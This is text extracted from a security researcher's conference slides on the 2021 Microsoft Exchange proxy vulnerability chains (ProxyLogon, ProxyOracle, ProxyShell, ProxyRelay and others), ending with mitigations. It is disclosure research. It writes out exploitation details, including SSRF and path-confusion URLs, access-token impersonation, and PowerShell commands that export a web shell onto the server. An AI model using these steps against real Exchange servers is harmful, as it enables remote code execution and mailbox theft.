1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
Arbitrary Backend Assignment
1
2
protected override AnchorMailbox ResolveAnchorMailbox() {
HttpCookie httpCookie = base.ClientRequest.Cookies["X-AnonResource-Backend"];
if (httpCookie != null) {
this.savedBackendServer = httpCookie.Value;
}
return new ServerInfoAnchorMailbox(
BackEndServer.FromString(this.savedBackendServer), this);
}
HttpProxy\OwaResourceProxyRequestHandler.cs
https://[foo]@example.com:443/path#]:444/owa/auth/x.js
Super SSRF
‚Ä¢ What's the root cause about this arbitrary backend assignment?
‚Ä¢ The Exchange has to adapt the compatibility between new and old architectures, 
hence Exchange introduces the cookie
‚Ä¢ A Super SSRF
‚Ä¢ Control almost all the HTTP request and get all the response
‚Ä¢ Attach with a Kerberos Ticket with Exchange$ account privilege automatically
‚Ä¢ Leverage the backend internal API /ecp/proxylogon.ecp to obtain a valid Control 
Panel session and a file-write bug to get RCE
Demo
https://youtu.be/SvjGMo9aMwE
ProxyOracle
‚Ä¢ An interesting Exchange Server exploit with different approach
‚Ä¢ An unauthenticated attacker can recover the victim's username and password 
in plaintext format simply by pushing the user open the malicious link
‚Ä¢ ProxyOracle is chained with 2 bugs:
‚Ä¢ CVE-2021-31195 - Reflected Cross-Site Scripting 
‚Ä¢ CVE-2021-31196 - Padding Oracle Attack on Exchange Cookies Parsing
How Users Log-in OWA/ECP?
Form-Based Authentication
IIS
IIS
Remote
PowerShell
RPC 
Proxy
EWS/OWA
ECP/OAB‚Ä¶
Mailbox Database
HTTP/HTTPS
IIS Modules
Validation
Logging
IIS Modules
Filter
FBA
Oauth
‚Ä¶
Rehydration
Routing
Update
RBAC
HTTP Proxy Module
How FBA Cookies Looks Like
cadataTTL
cadataKey
cadata
cadataIV
cadataSig
FbaModule Encryption Logic
@key = GetServerSSLCert().GetPrivateKey()
cadataSig = RSA(@key).Encrypt("Fba Rocks!")
cadataIV
= RSA(@key).Encrypt(GetRandomBytes(16))
cadataKey = RSA(@key).Encrypt(GetRandomBytes(16))
@timestamp = GetCurrentTimestamp()
cadataTTL
= AES_CBC(cadataKey, cadataIV).Encrypt(@timestamp)
@blob  = "Basic " + ToBase64String(UserName + ":" + Password)
cadata = AES_CBC(cadataKey, cadataIV).Encrypt(@blob)
PSEUDO CODE
FbaModule Encryption Logic
private void ParseCadataCookies(HttpApplication httpApplication) {
using (ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor()) {
try {
byte[] array5 = Convert.FromBase64String(request.Cookies["cadata"].Value);
bytes2 = transform.TransformFinalBlock(array5, 0, array5.Length);
} catch (CryptographicException arg8) {
return;
}
}
}
HttpProxy\FbaModule.cs
The Oracle
protected enum LogonReason {
None,
Logoff,
InvalidCredentials,
Timeout,
ChangePasswordLogoff
}
\FbaModule.cs
Padding 
Error
Padding 
Good
Login
Failure
Login
Success
AES
Decrypt
/logon.aspx
?reason=2
Continue
Login
/logon.aspx
?reason=0
We can decrypt the cookies now
But‚Ä¶ How to get the client cookies?
We discover a new XSS to chain together
However, all sensitive cookies are protected by HttpOnlyüò•
Take Over Client Requests
Visit page /foo.gif
Send response
Proxy page /foo.gif
Send response
Send malicious mail to victim
Trigger the XSS
Set SSRF cookie
Victim
Exchange
Attacker
Open malicious mail
Redirect to XSS page
1
2
3
4
Demo
https://youtu.be/VuJvmJZxogc
ProxyShell
‚Ä¢ The exploit chain we demonstrated at Pwn2Own 2021
‚Ä¢ An unauthenticated attacker can execute arbitrary commands on Microsoft 
Exchange Server through an only exposed 443 port!
‚Ä¢ ProxyShell is chained with 3 bugs:
‚Ä¢ CVE-2021-34473 - Pre-auth Path Confusion leads to ACL Bypass
‚Ä¢ CVE-2021-34523 - Elevation of Privilege on Exchange PowerShell Backend
‚Ä¢ CVE-2021-31207
- Post-auth Arbitrary-File-Write leads to RCE
Where ProxyShell Begin?
1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
ProxyShell
‚Ä¢ ProxyShell started with a Path Confusion bug on Exchange Server  
Explicit Logon feature
‚Ä¢ The feature is designed to enable users to open another mailbox/calendar and 
display it in a new browser window
‚Ä¢ The Exchange parsed the mailbox address and normalized the URL internally
https://exchange/OWA/PI:EMAIL/Default.aspx
2
Extract Mailbox Address from URL
1
protected override AnchorMailbox ResolveAnchorMailbox() {
if (RequestPathParser.IsAutodiscoverV2PreviewRequest(base.ClientRequest.Url.AbsolutePath)) 
text = base.ClientRequest.Params["Email"];
// ‚Ä¶
this.isExplicitLogonRequest = true;
this.explicitLogonAddress = text;
}
public static bool IsAutodiscoverV2PreviewRequest(string path) {
return path.EndsWith("/autodiscover.json", StringComparison.OrdinalIgnoreCase);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
The Fatal Erase
protected override UriBuilder GetClientUrlForProxy() {
string absoluteUri = base.ClientRequest.Url.AbsoluteUri;
uri = UrlHelper.RemoveExplicitLogonFromUrlAbsoluteUri(absoluteUri, 
this.explicitLogonAddress);
return new UriBuilder(uri);
}
public static string RemoveExplicitLogonFromUrlAbsoluteUri(string absoluteUri, string
explicitLogonAddress) {
string text = "/" + explicitLogonAddress;
if (absoluteUri.IndexOf(text) != -1)
return absoluteUri.Substring(0, num) + absoluteUri.Substring(num + text.Length);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
1
2
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
https://exchange:444/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
Arbitrary Backend Access Again!
Exchange PowerShell Remoting
‚Ä¢ The Exchange PowerShell Remoting is a command-line interface that 
enables the automation of Exchange tasks
‚Ä¢ The Exchange PowerShell Remoting is built upon PowerShell API and uses the 
Runspace for isolations. All operations are based on WinRM protocol
‚Ä¢ Interact with the PowerShell Backend fails because there is no mailbox for the 
SYSTEM user
‚Ä¢ We found a piece of code extract Access-Token from URL 
Extract Access Token from URL
2
1
private void OnAuthenticateRequest(object source, EventArgs args) {
HttpContext httpContext = HttpContext.Current;
if (httpContext.Request.IsAuthenticated) {
if (string.IsNullOrEmpty(httpContext.Request.Headers["X-CommonAccessToken"])) {
Uri url = httpContext.Request.Url;
Exception ex = null;
CommonAccessToken commonAccessToken = CommonAccessTokenFromUrl(httpContext.
User.Identity.ToString(), url, out ex);
}
}
}
\Configuration\RemotePowershellBackendCmdletProxyModule.cs
Extract Access Token from URL
private CommonAccessToken CommonAccessTokenFromUrl(string user, Uri requestURI, 
out Exception ex) {
CommonAccessToken result = null;
string text = LiveIdBasicAuthModule.GetNameValueCollectionFromUri(
requestURI).Get("X-Rps-CAT");
result = CommonAccessToken.Deserialize(Uri.UnescapeDataString(text));
return result;
}
\RemotePowershellBackendCmdletProxyModule.cs
Privilege Downgrade
‚Ä¢ An Elevation of Privilege (EOP) because we can access Exchange 
PowerShell Backend directly
‚Ä¢ The intention of this operation is to be a quick proxy for Internal Exchange 
PowerShell communications
‚Ä¢ Specify the Access-Token in X-Rps-CAT to Impersonate to any user
‚Ä¢ We use this Privilege Escalation to "downgrade" ourself from SYSTEM to Exchange 
Admin
Execute Arbitrary Exchange PowerShell as Admin
And then?
Attack Exchange PowerShell
‚Ä¢ The last piece of the puzzle is to find a post-auth RCE to chain together
‚Ä¢ Since we are Exchange admin now, It's easy to abuse the Exchange PowerShell 
command New-MailboxExportRequest to export user's mailbox into an UNC path
New-MailboxExportRequest ‚ÄìMailbox PI:EMAIL
‚ÄìFilePath \\127.0.0.1\C$\path\to\shell.aspx
Payload Delivery
‚Ä¢ How to embed the malicious payload into the exported file?
‚Ä¢ We deliver the malicious payloads by Emails (SMTP)  but the file is encodedüò¢
‚Ä¢ The exported file is in Outlook Personal Folders (PST) format, by reading the MS-
PST documentation, we learned it's just a simple permutation encoding
mpbbCrypt = [65, 54, 19, 98, 168, 33, 110, 187, 244, 22, 204, 4, 127, 100, 232, ‚Ä¶]
encode_table = bytes.maketrans((bytearray(mpbbCrypt), bytearray(range(256)))
'‚Ä¶'.translate(encode_table)
\RemotePowershellBackendCmdletProxyModule.cs
Put it All Together
1.
Deliver our encoded WebShell payload by SMTP 
2. Launch the native PowerShell and intercept the WinRM protocol
‚Ä¢ Rewrite the /PowerShell/ to /Autodiscover/ to trigger the Path Confusion bug
‚Ä¢ Add query string X-Rps-CAT with corresponding Exchange Admin Access Token
3. Execute commands inside the established PowerShell session
‚Ä¢ New-ManagementRoleAssignment to grant ourself Mailbox Import Export Role
‚Ä¢ New-MailboxExportRequest to write ASPX file into the local UNC path
4. Enjoy the shell
Demo
https://youtu.be/FC6iHw258RI
Proxy-Related Attacks
ProxyLogon
‚Ä¢ CVE-2021-26855
‚Ä¢ CVE-2021-27065
ProxyNotFound
‚Ä¢ CVE-2021-28480
‚Ä¢ CVE-2021-28481
ProxyToken
‚Ä¢ CVE-2021-33766
ProxyOracle
‚Ä¢ CVE-2021-31195
‚Ä¢ CVE-2021-31196
ProxyRelay
‚Ä¢ CVE-2021-33768
‚Ä¢ CVE-2021-TBA
ProxyShell
‚Ä¢ CVE-2021-34473
‚Ä¢ CVE-2021-34523
‚Ä¢ CVE-2021-31207
ProxyNotFound
‚Ä¢ Exchange vulnerabilities reported by NSA (Dubbed by NCSC Vietnam)
‚Ä¢ CVE-2021-28480 - Pre-auth SSRF/ACL bypass
‚Ä¢ CVE-2021-28481 - Pre-auth SSRF/ACL bypass
‚Ä¢ Also under our new attack surface
‚Ä¢ The bug located at the FrontEnd of CAS
‚Ä¢ The root cause is similar to the pre-auth part of ProxyLogon but retrieving another 
user-supplied cookie as the BackEnd target
ProxyNotFound: Arbitrary Backend 
Assignment
protected override AnchoredRoutingTarget TryFastTargetCalculationByAnchorMailbox(
AnchorMailbox anchorMailbox) {
if (this.backEndCookie == null || !base.IsRetryOnErrorEnabled) {
this.FetchBackEndServerCookie();
}
BackEndServer backEndServer = anchorMailbox.AcceptBackEndCookie(this.backEndCookie)
}
private void FetchBackEndServerCookie() {
foreach (string text in new string[] {"X-BackEndCookie", "X-BackEndCookie2"}) {
// ...
httpCookie.Values[text] = backEndCookieEntryBase.ToObscureString();
}
}
HttpProxy\BEServerCookieProxyRequestHandler.cs
BASE64 Decode
XOR with 0xFF
server~x]@ex2019:444/mapi/nspi/?a.a#~
1941962753~12/1/2021 12:25:12 AM
Proxy-Related Attacks
ProxyLogon
‚Ä¢ CVE-2021-26855
‚Ä¢ CVE-2021-27065
ProxyNotFound
‚Ä¢ CVE-2021-28480
‚Ä¢ CVE-2021-28481
ProxyToken
‚Ä¢ CVE-2021-33766
ProxyOracle
‚Ä¢ CVE-2021-31195
‚Ä¢ CVE-2021-31196
ProxyRelay
‚Ä¢ CVE-2021-33768
‚Ä¢ CVE-2021-TBA
ProxyShell
‚Ä¢ CVE-2021-34473
‚Ä¢ CVE-2021-34523
‚Ä¢ CVE-2021-31207
ProxyToken
‚Ä¢ Exchange vulnerability reported by Le Xuan Tuyen of VNPT ISC (working 
with Zero Day Initiative)
‚Ä¢ CVE-2021-33766 - Authentication bypass
‚Ä¢ Exploit the "Delegated Authentication" feature in the CAS FrontEnd to 
perform configuration actions on users
‚Ä¢ Also under our new attack surface ;)
‚Ä¢ Install a mail forwarding rule to read any user's incoming mail
The April Patch Kills (almost) All‚Ä¶
Post-Proxy Era of MS Exchange
‚Ä¢ The pre-auth part of this new attack surface has been mitigated
‚Ä¢ The attack surface may not be as powerful as before :(
‚Ä¢ Is there any new hope?
1.
The path confusion of ProxyShell is still alive
2.
The mechanism between the FrontEnd and BackEnd is still interesting
3.
Combine another level issues/features to rescue the auth bypass
Proxy-Related Attacks
ProxyLogon
‚Ä¢ CVE-2021-26855
‚Ä¢ CVE-2021-27065
ProxyNotFound
‚Ä¢ CVE-2021-28480
‚Ä¢ CVE-2021-28481
ProxyToken
‚Ä¢ CVE-2021-33766
ProxyOracle
‚Ä¢ CVE-2021-31195
‚Ä¢ CVE-2021-31196
ProxyRelay
‚Ä¢ CVE-2021-33768
‚Ä¢ CVE-2021-TBA
ProxyShell
‚Ä¢ CVE-2021-34473
‚Ä¢ CVE-2021-34523
‚Ä¢ CVE-2021-31207
ProxyRelay
‚Ä¢ ProxyRelay is a set of authentication bypass attacks that allows  an 
attacker to impersonate as any users (works perfectly after April Patch!)
‚Ä¢ CVE-2021-33768
‚Ä¢ CVE-2021-TBA
‚Ä¢ ...
‚Ä¢ Exploit the NTLM-Relay to bypass the authentication of CAS Proxy
‚Ä¢ ProxyRelay = CAS Proxy + NTLM-Relay
Problems to be Solved
‚Ä¢ NTLM-Relay requires the user to trigger the relay passively
‚Ä¢ Bypass: Printer-Bug for the rescue!
‚Ä¢ NTLM-Relay protection: Same-Host Reflection
‚Ä¢ Bypass: Exchange Cluster is common in corporations. We relay the NTLM 
of server-A to server-B so that it won't trigger any Same-Host detection!
‚Ä¢ NTLM-Relay protection: SMB Signing / Channel Binding
‚Ä¢ Bypass: We use SMB-to-HTTPS. Exchange disables the TLS Channel 
Binding by default!
CVE-2021-33768
‚Ä¢ MSRC acknowledges 2 researchers in the advisory
‚Ä¢ Tianze Ding (@D1iv3) with Tencent Security Xuanwu Lab
‚Ä¢ Orange Tsai (@orange_8361) from DEVCORE Research Team
‚Ä¢ The exploit concept:
1.
Trigger the Printer-Bug on Exchange-A
2.
Relay the NTLM to the FrontEnd of Exchange-B to bypass the CAS authentication
3.
Forge the authorization part in EWS to impersonate as any user
‚Ä¢ The June 2021 patch mitigated the CVE by prohibiting Exchange Machine 
Account from authenticating in the FrontEnd
CVE-2021-TBA
‚Ä¢ CVE-2021-TBA is another similar but more fundamental vulnerability
‚Ä¢ Report to MSRC at June 02, 2021 with 90(+30) days disclosure policy
‚Ä¢ After a discussion with MSRC, it looks like there are no quick and simple fixes, but 
design level changes. The patch should require an amount of time for preparation 
and testing
‚Ä¢ As a responsible researcher, sorry we decide NOT to disclose today
Demo
To Be Released
Mitigations
1.
Keep Exchange Server up-to-date
2.
Do not externally face Exchange Server to the Internet (especially web)
3. About ProxyRelay, as to a design-level issue, your hands are tied :(
‚Ä¢ Stop Printer Spooler Service
‚Ä¢ Disable NTLM authentication (didn't check if there are any side-effects yet)
4.
Move to Office 365 Exchange Onlineüòè(Just kidding)
orange_8361
PI:EMAIL
Thanks!
https://blog.orange.tw